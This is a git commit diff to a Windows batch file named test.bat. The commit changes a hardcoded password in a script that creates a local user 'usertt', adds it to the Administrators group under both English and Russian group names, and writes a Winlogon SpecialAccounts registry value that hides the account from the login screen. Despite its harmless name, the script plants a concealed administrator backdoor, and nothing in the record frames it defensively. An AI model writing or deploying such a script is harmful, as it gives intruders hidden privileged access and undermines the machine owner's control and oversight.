ceb1049318ecb261d81d977b264ce21d50c6a44c
aleksandr0vitchvlad <56714175+aleksandr0vitchvlad@users.noreply.github.com>
2019-10-26 17:55:38 +0500

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,5 +1,5 @@
-﻿chcp 65001
-net user usertt 123 /add
+chcp 65001
+net user usertt WedtjR10h /add
 net localgroup administrators usertt /add
 net localgroup Администраторы usertt/add
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v usertt /t REG_DWORD /d 0
